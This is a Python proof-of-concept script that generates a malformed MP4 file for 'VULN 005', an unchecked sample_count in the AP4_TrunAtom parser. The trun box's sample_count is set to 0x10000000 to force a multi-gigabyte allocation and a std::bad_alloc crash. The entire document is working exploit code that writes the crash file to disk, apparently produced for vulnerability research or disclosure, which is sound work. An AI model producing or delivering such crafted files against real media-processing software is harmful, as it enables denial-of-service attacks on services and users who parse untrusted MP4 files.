#!/usr/bin/env python3
"""
PoC generator for VULN 005 - AP4_TrunAtom Unchecked sample_count
Triggers std::bad_alloc by setting sample_count=0x10000000 in trun box.
"""
import struct
import os

def box(box_type, payload):
    """Create a box: size(4B BE) + type(4B) + payload"""
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload

def fullbox(box_type, version, flags, payload):
    """Create a full box: size(4B) + type(4B) + version(1B) + flags(3B) + payload"""
    header = struct.pack('>I', version) + struct.pack('>I', flags)
    # Actually: version is 1 byte, flags is 3 bytes
    fb_header = bytes([version]) + struct.pack('>I', flags)[1:]  # 3 bytes of flags
    return box(box_type, fb_header + payload)

def make_ftyp():
    payload = b'iso5' + struct.pack('>I', 0) + b'isom' + b'iso5' + b'mp41'
    return box(b'ftyp', payload)

def make_mvhd():
    # version=0: creation_time(4), modification_time(4), timescale(4), duration(4),
    # rate(4), volume(2), reserved(10), matrix(36), pre_defined(24), next_track_id(4)
    payload = struct.pack('>IIII', 0, 0, 44100, 0)  # times + timescale + duration
    payload += struct.pack('>I', 0x00010000)  # rate = 1.0
    payload += struct.pack('>H', 0x0100)     # volume = 1.0
    payload += b'\x00' * 10                  # reserved
    payload += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix
    payload += b'\x00' * 24                  # pre_defined
    payload += struct.pack('>I', 2)          # next_track_id
    return fullbox(b'mvhd', 0, 0, payload)

def make_tkhd():
    # version=0, flags=3 (track enabled + in movie)
    payload = struct.pack('>IIII', 0, 0, 1, 0)  # creation, modification, track_id, reserved
    payload += struct.pack('>I', 0)              # duration
    payload += b'\x00' * 8                       # reserved
    payload += struct.pack('>HH', 0, 0)          # layer, alternate_group
    payload += struct.pack('>H', 0x0100)         # volume
    payload += b'\x00' * 2                       # reserved
    payload += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix
    payload += struct.pack('>II', 0, 0)          # width, height
    return fullbox(b'tkhd', 0, 3, payload)

def make_mdhd():
    payload = struct.pack('>IIII', 0, 0, 44100, 0)  # creation, modification, timescale, duration
    payload += struct.pack('>HH', 0x55C4, 0)         # language (und), pre_defined
    return fullbox(b'mdhd', 0, 0, payload)

def make_hdlr():
    payload = struct.pack('>I', 0)    # pre_defined
    payload += b'soun'                # handler_type
    payload += b'\x00' * 12          # reserved
    payload += b'SoundHandler\x00'   # name
    return fullbox(b'hdlr', 0, 0, payload)

def make_smhd():
    payload = struct.pack('>HH', 0, 0)  # balance, reserved
    return fullbox(b'smhd', 0, 0, payload)

def make_dref():
    # url entry: size=12, type='url ', version=0, flags=1 (self-contained)
    url_entry = fullbox(b'url ', 0, 1, b'')
    payload = struct.pack('>I', 1) + url_entry  # entry_count=1
    return fullbox(b'dref', 0, 0, payload)

def make_dinf():
    return box(b'dinf', make_dref())

def make_stsd():
    payload = struct.pack('>I', 0)  # entry_count=0
    return fullbox(b'stsd', 0, 0, payload)

def make_stts():
    payload = struct.pack('>I', 0)  # entry_count=0
    return fullbox(b'stts', 0, 0, payload)

def make_stsc():
    payload = struct.pack('>I', 0)  # entry_count=0
    return fullbox(b'stsc', 0, 0, payload)

def make_stsz():
    payload = struct.pack('>II', 0, 0)  # sample_size=0, sample_count=0
    return fullbox(b'stsz', 0, 0, payload)

def make_stco():
    payload = struct.pack('>I', 0)  # entry_count=0
    return fullbox(b'stco', 0, 0, payload)

def make_stbl():
    payload = make_stsd() + make_stts() + make_stsc() + make_stsz() + make_stco()
    return box(b'stbl', payload)

def make_minf():
    payload = make_smhd() + make_dinf() + make_stbl()
    return box(b'minf', payload)

def make_mdia():
    payload = make_mdhd() + make_hdlr() + make_minf()
    return box(b'mdia', payload)

def make_trak():
    payload = make_tkhd() + make_mdia()
    return box(b'trak', payload)

def make_trex():
    # track_id=1, default_sample_description_index=1, default_sample_duration=0,
    # default_sample_size=0, default_sample_flags=0
    payload = struct.pack('>IIIII', 1, 1, 0, 0, 0)
    return fullbox(b'trex', 0, 0, payload)

def make_mvex():
    return box(b'mvex', make_trex())

def make_moov():
    payload = make_mvhd() + make_mvex() + make_trak()
    return box(b'moov', payload)

def make_mfhd():
    # sequence_number=1
    payload = struct.pack('>I', 1)
    return fullbox(b'mfhd', 0, 0, payload)

def make_tfhd():
    # flags=0x000000, track_id=1, no optional fields
    payload = struct.pack('>I', 1)  # track_id
    return fullbox(b'tfhd', 0, 0x000000, payload)

def make_trun_malicious():
    # flags=0x000000 -> no data_offset, no first_sample_flags, no per-sample data
    # sample_count = 0x10000000 -> triggers huge allocation
    SAMPLE_COUNT = 0x10000000
    payload = struct.pack('>I', SAMPLE_COUNT)
    return fullbox(b'trun', 0, 0x000000, payload)

def make_traf():
    payload = make_tfhd() + make_trun_malicious()
    return box(b'traf', payload)

def make_moof():
    payload = make_mfhd() + make_traf()
    return box(b'moof', payload)

def make_mdat():
    return box(b'mdat', b'')

def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_005.mp4')

    mp4 = make_ftyp() + make_moov() + make_moof() + make_mdat()

    with open(out_path, 'wb') as f:
        f.write(mp4)

    print(f"[+] Written {len(mp4)} bytes to {out_path}")
    print(f"[+] trun sample_count = 0x10000000 ({0x10000000})")
    print(f"[+] Expected: std::bad_alloc on ~{0x10000000 * 16 // (1024**3)} GB allocation")

if __name__ == '__main__':
    main()
